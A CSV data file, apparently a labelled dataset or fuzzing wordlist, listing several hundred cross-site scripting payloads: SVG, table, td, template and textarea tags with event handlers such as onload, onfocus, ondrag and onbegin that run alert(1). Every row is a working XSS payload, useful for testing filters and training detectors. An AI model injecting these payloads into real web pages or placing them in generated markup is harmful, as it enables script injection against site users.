payload,attack
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",XSS
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",XSS
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,XSS
"<svg onclick=""alert(1)"">test</svg>",XSS
"<svg oncontextmenu=""alert(1)"">test</svg>",XSS
"<svg oncopy=""alert(1)"" contenteditable>test</svg>",XSS
"<svg oncut=""alert(1)"" contenteditable>test</svg>",XSS
"<svg ondblclick=""alert(1)"">test</svg>",XSS
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,XSS
"<svg onkeydown=""alert(1)"" contenteditable>test</svg>",XSS
"<svg onkeypress=""alert(1)"" contenteditable>test</svg>",XSS
"<svg onkeyup=""alert(1)"" contenteditable>test</svg>",XSS
<svg onload=alert(1)>,XSS
"<svg onmousedown=""alert(1)"">test</svg>",XSS
"<svg onmouseenter=""alert(1)"">test</svg>",XSS
"<svg onmouseleave=""alert(1)"">test</svg>",XSS
"<svg onmousemove=""alert(1)"">test</svg>",XSS
"<svg onmouseout=""alert(1)"">test</svg>",XSS
"<svg onmouseover=""alert(1)"">test</svg>",XSS
"<svg onmouseup=""alert(1)"">test</svg>",XSS
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",XSS
<svg onunload=window.open('javascript:alert(1)')>,XSS
<svg><a onload=alert(1)></a>,XSS
<svg><abbr onload=alert(1)></abbr>,XSS
<svg><acronym onload=alert(1)></acronym>,XSS
<svg><address onload=alert(1)></address>,XSS
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,XSS
<svg><animate onend=alert(1) attributeName=x dur=1s>,XSS
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,XSS
<svg><animatetransform onbegin=alert(1) attributeName=transform>,XSS
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,XSS
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>,XSS
<svg><applet onload=alert(1)></applet>,XSS
<svg><area onload=alert(1)></area>,XSS
<svg><article onload=alert(1)></article>,XSS
<svg><aside onload=alert(1)></aside>,XSS
<svg><audio onload=alert(1)></audio>,XSS
<svg><b onload=alert(1)></b>,XSS
<svg><base onload=alert(1)></base>,XSS
<svg><basefont onload=alert(1)></basefont>,XSS
<svg><bdi onload=alert(1)></bdi>,XSS
<svg><bdo onload=alert(1)></bdo>,XSS
<svg><bgsound onload=alert(1)></bgsound>,XSS
<svg><big onload=alert(1)></big>,XSS
<svg><blink onload=alert(1)></blink>,XSS
<svg><blockquote onload=alert(1)></blockquote>,XSS
<svg><br onload=alert(1)></br>,XSS
<svg><button onload=alert(1)></button>,XSS
<svg><canvas onload=alert(1)></canvas>,XSS
<svg><caption onload=alert(1)></caption>,XSS
<svg><center onload=alert(1)></center>,XSS
<svg><cite onload=alert(1)></cite>,XSS
<svg><code onload=alert(1)></code>,XSS
<svg><col onload=alert(1)></col>,XSS
<svg><colgroup onload=alert(1)></colgroup>,XSS
<svg><command onload=alert(1)></command>,XSS
<svg><content onload=alert(1)></content>,XSS
<svg><data onload=alert(1)></data>,XSS
<svg><datalist onload=alert(1)></datalist>,XSS
<svg><dd onload=alert(1)></dd>,XSS
<svg><del onload=alert(1)></del>,XSS
<svg><details onload=alert(1)></details>,XSS
<svg><dfn onload=alert(1)></dfn>,XSS
<svg><dialog onload=alert(1)></dialog>,XSS
<svg><dir onload=alert(1)></dir>,XSS
<svg><discard onbegin=alert(1)>,XSS
<svg><div onload=alert(1)></div>,XSS
<svg><dl onload=alert(1)></dl>,XSS
<svg><dt onload=alert(1)></dt>,XSS
<svg><element onload=alert(1)></element>,XSS
<svg><em onload=alert(1)></em>,XSS
<svg><fieldset onload=alert(1)></fieldset>,XSS
<svg><figcaption onload=alert(1)></figcaption>,XSS
<svg><figure onload=alert(1)></figure>,XSS
<svg><font onload=alert(1)></font>,XSS
<svg><footer onload=alert(1)></footer>,XSS
<svg><form onload=alert(1)></form>,XSS
<svg><frameset onload=alert(1)></frameset>,XSS
<svg><h1 onload=alert(1)></h1>,XSS
<svg><head onload=alert(1)></head>,XSS
<svg><header onload=alert(1)></header>,XSS
<svg><hgroup onload=alert(1)></hgroup>,XSS
<svg><hr onload=alert(1)></hr>,XSS
<svg><html onload=alert(1)></html>,XSS
<svg><i onload=alert(1)></i>,XSS
<svg><image href=1 onerror=alert(1)>,XSS
<svg><image href=validimage.png onload=alert(1)>,XSS
<svg><ins onload=alert(1)></ins>,XSS
<svg><kbd onload=alert(1)></kbd>,XSS
<svg><keygen onload=alert(1)></keygen>,XSS
<svg><label onload=alert(1)></label>,XSS
<svg><legend onload=alert(1)></legend>,XSS
<svg><li onload=alert(1)></li>,XSS
<svg><listing onload=alert(1)></listing>,XSS
<svg><main onload=alert(1)></main>,XSS
<svg><map onload=alert(1)></map>,XSS
<svg><mark onload=alert(1)></mark>,XSS
<svg><marquee onload=alert(1)></marquee>,XSS
<svg><menu onload=alert(1)></menu>,XSS
<svg><menuitem onload=alert(1)></menuitem>,XSS
<svg><meta onload=alert(1)></meta>,XSS
<svg><meter onload=alert(1)></meter>,XSS
<svg><multicol onload=alert(1)></multicol>,XSS
<svg><nav onload=alert(1)></nav>,XSS
<svg><nextid onload=alert(1)></nextid>,XSS
<svg><nobr onload=alert(1)></nobr>,XSS
<svg><noembed onload=alert(1)></noembed>,XSS
<svg><noframes onload=alert(1)></noframes>,XSS
<svg><noscript onload=alert(1)></noscript>,XSS
<svg><ol onload=alert(1)></ol>,XSS
<svg><optgroup onload=alert(1)></optgroup>,XSS
<svg><option onload=alert(1)></option>,XSS
<svg><output onload=alert(1)></output>,XSS
<svg><p onload=alert(1)></p>,XSS
<svg><param onload=alert(1)></param>,XSS
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",XSS
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,XSS
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",XSS
<svg><picture onload=alert(1)></picture>,XSS
<svg><plaintext onload=alert(1)></plaintext>,XSS
<svg><pre onload=alert(1)></pre>,XSS
<svg><progress onload=alert(1)></progress>,XSS
<svg><q onload=alert(1)></q>,XSS
<svg><rb onload=alert(1)></rb>,XSS
<svg><rp onload=alert(1)></rp>,XSS
<svg><rt onload=alert(1)></rt>,XSS
<svg><rtc onload=alert(1)></rtc>,XSS
<svg><ruby onload=alert(1)></ruby>,XSS
<svg><s onload=alert(1)></s>,XSS
<svg><samp onload=alert(1)></samp>,XSS
<svg><section onload=alert(1)></section>,XSS
<svg><select onload=alert(1)></select>,XSS
<svg><set onbegin=alert(1) attributename=x dur=1s>,XSS
<svg><set onend=alert(1) attributename=x dur=1s>,XSS
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,XSS
<svg><shadow onload=alert(1)></shadow>,XSS
<svg><slot onload=alert(1)></slot>,XSS
<svg><small onload=alert(1)></small>,XSS
<svg><source onload=alert(1)></source>,XSS
<svg><spacer onload=alert(1)></spacer>,XSS
<svg><span onload=alert(1)></span>,XSS
<svg><strike onload=alert(1)></strike>,XSS
<svg><strong onload=alert(1)></strong>,XSS
<svg><sub onload=alert(1)></sub>,XSS
<svg><summary onload=alert(1)></summary>,XSS
<svg><sup onload=alert(1)></sup>,XSS
<svg><table onload=alert(1)></table>,XSS
<svg><tbody onload=alert(1)></tbody>,XSS
<svg><td onload=alert(1)></td>,XSS
<svg><template onload=alert(1)></template>,XSS
<svg><textarea onload=alert(1)></textarea>,XSS
<svg><tfoot onload=alert(1)></tfoot>,XSS
<svg><th onload=alert(1)></th>,XSS
<svg><thead onload=alert(1)></thead>,XSS
<svg><time onload=alert(1)></time>,XSS
<svg><title onload=alert(1)></title>,XSS
<svg><tr onload=alert(1)></tr>,XSS
<svg><tt onload=alert(1)></tt>,XSS
<svg><u onload=alert(1)></u>,XSS
<svg><ul onload=alert(1)></ul>,XSS
<svg><var onload=alert(1)></var>,XSS
<svg><video onload=alert(1)></video>,XSS
<svg><wbr onload=alert(1)></wbr>,XSS
<svg><xmp onload=alert(1)></xmp>,XSS
<svg><xss onload=alert(1)></xss>,XSS
"<table draggable=""true"" ondrag=""alert(1)"">test</table>",XSS
"<table draggable=""true"" ondragend=""alert(1)"">test</table>",XSS
"<table draggable=""true"" ondragenter=""alert(1)"">test</table>",XSS
"<table draggable=""true"" ondragleave=""alert(1)"">test</table>",XSS
"<table draggable=""true"" ondragstart=""alert(1)"">test</table>",XSS
<table id=x tabindex=1 onactivate=alert(1)></table>,XSS
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,XSS
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,XSS
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,XSS
<table id=x tabindex=1 onfocus=alert(1)></table>,XSS
<table id=x tabindex=1 onfocusin=alert(1)></table>,XSS
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",XSS
"<table onbeforecut=""alert(1)"" contenteditable>test</table>",XSS
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",XSS
<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>,XSS
"<table onclick=""alert(1)"">test</table>",XSS
"<table oncontextmenu=""alert(1)"">test</table>",XSS
"<table oncopy=""alert(1)"" contenteditable>test</table>",XSS
"<table oncut=""alert(1)"" contenteditable>test</table>",XSS
"<table ondblclick=""alert(1)"">test</table>",XSS
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,XSS
"<table onkeydown=""alert(1)"" contenteditable>test</table>",XSS
"<table onkeypress=""alert(1)"" contenteditable>test</table>",XSS
"<table onkeyup=""alert(1)"" contenteditable>test</table>",XSS
"<table onmousedown=""alert(1)"">test</table>",XSS
"<table onmouseenter=""alert(1)"">test</table>",XSS
"<table onmouseleave=""alert(1)"">test</table>",XSS
"<table onmousemove=""alert(1)"">test</table>",XSS
"<table onmouseout=""alert(1)"">test</table>",XSS
"<table onmouseover=""alert(1)"">test</table>",XSS
"<table onmouseup=""alert(1)"">test</table>",XSS
"<table onpaste=""alert(1)"" contenteditable>test</table>",XSS
"<tbody draggable=""true"" ondrag=""alert(1)"">test</tbody>",XSS
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",XSS
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",XSS
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",XSS
"<tbody draggable=""true"" ondragstart=""alert(1)"">test</tbody>",XSS
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,XSS
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,XSS
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,XSS
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>,XSS
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,XSS
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,XSS
"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody onbeforecut=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",XSS
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,XSS
"<tbody onclick=""alert(1)"">test</tbody>",XSS
"<tbody oncontextmenu=""alert(1)"">test</tbody>",XSS
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody ondblclick=""alert(1)"">test</tbody>",XSS
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,XSS
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",XSS
"<tbody onmousedown=""alert(1)"">test</tbody>",XSS
"<tbody onmouseenter=""alert(1)"">test</tbody>",XSS
"<tbody onmouseleave=""alert(1)"">test</tbody>",XSS
"<tbody onmousemove=""alert(1)"">test</tbody>",XSS
"<tbody onmouseout=""alert(1)"">test</tbody>",XSS
"<tbody onmouseover=""alert(1)"">test</tbody>",XSS
"<tbody onmouseup=""alert(1)"">test</tbody>",XSS
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",XSS
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",XSS
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",XSS
"<td draggable=""true"" ondragenter=""alert(1)"">test</td>",XSS
"<td draggable=""true"" ondragleave=""alert(1)"">test</td>",XSS
"<td draggable=""true"" ondragstart=""alert(1)"">test</td>",XSS
<td id=x tabindex=1 onactivate=alert(1)></td>,XSS
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,XSS
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,XSS
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,XSS
<td id=x tabindex=1 onfocus=alert(1)></td>,XSS
<td id=x tabindex=1 onfocusin=alert(1)></td>,XSS
"<td onbeforecopy=""alert(1)"" contenteditable>test</td>",XSS
"<td onbeforecut=""alert(1)"" contenteditable>test</td>",XSS
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",XSS
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,XSS
"<td onclick=""alert(1)"">test</td>",XSS
"<td oncontextmenu=""alert(1)"">test</td>",XSS
"<td oncopy=""alert(1)"" contenteditable>test</td>",XSS
"<td oncut=""alert(1)"" contenteditable>test</td>",XSS
"<td ondblclick=""alert(1)"">test</td>",XSS
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,XSS
"<td onkeydown=""alert(1)"" contenteditable>test</td>",XSS
"<td onkeypress=""alert(1)"" contenteditable>test</td>",XSS
"<td onkeyup=""alert(1)"" contenteditable>test</td>",XSS
"<td onmousedown=""alert(1)"">test</td>",XSS
"<td onmouseenter=""alert(1)"">test</td>",XSS
"<td onmouseleave=""alert(1)"">test</td>",XSS
"<td onmousemove=""alert(1)"">test</td>",XSS
"<td onmouseout=""alert(1)"">test</td>",XSS
"<td onmouseover=""alert(1)"">test</td>",XSS
"<td onmouseup=""alert(1)"">test</td>",XSS
"<td onpaste=""alert(1)"" contenteditable>test</td>",XSS
"<template draggable=""true"" ondrag=""alert(1)"">test</template>",XSS
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",XSS
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",XSS
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",XSS
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",XSS
<template id=x tabindex=1 onactivate=alert(1)></template>,XSS
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>,XSS
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,XSS
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,XSS
<template id=x tabindex=1 onfocus=alert(1)></template>,XSS
<template id=x tabindex=1 onfocusin=alert(1)></template>,XSS
"<template onbeforecopy=""alert(1)"" contenteditable>test</template>",XSS
"<template onbeforecut=""alert(1)"" contenteditable>test</template>",XSS
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",XSS
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,XSS
"<template onclick=""alert(1)"">test</template>",XSS
"<template oncontextmenu=""alert(1)"">test</template>",XSS
"<template oncopy=""alert(1)"" contenteditable>test</template>",XSS
"<template oncut=""alert(1)"" contenteditable>test</template>",XSS
"<template ondblclick=""alert(1)"">test</template>",XSS
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,XSS
"<template onkeydown=""alert(1)"" contenteditable>test</template>",XSS
"<template onkeypress=""alert(1)"" contenteditable>test</template>",XSS
"<template onkeyup=""alert(1)"" contenteditable>test</template>",XSS
"<template onmousedown=""alert(1)"">test</template>",XSS
"<template onmouseenter=""alert(1)"">test</template>",XSS
"<template onmouseleave=""alert(1)"">test</template>",XSS
"<template onmousemove=""alert(1)"">test</template>",XSS
"<template onmouseout=""alert(1)"">test</template>",XSS
"<template onmouseover=""alert(1)"">test</template>",XSS
"<template onmouseup=""alert(1)"">test</template>",XSS
"<template onpaste=""alert(1)"" contenteditable>test</template>",XSS
<textarea autofocus onfocus=alert(1)>test</textarea>,XSS
<textarea autofocus onfocusin=alert(1)>test</textarea>,XSS
"<textarea draggable=""true"" ondrag=""alert(1)"">test</textarea>",XSS
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",XSS
"<textarea draggable=""true"" ondragenter=""alert(1)"">test</textarea>",XSS
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",XSS
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",XSS
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,XSS
<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,XSS
<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,XSS
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,XSS
<textarea onauxclick=alert(1)>XSS</textarea>,XSS
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,XSS
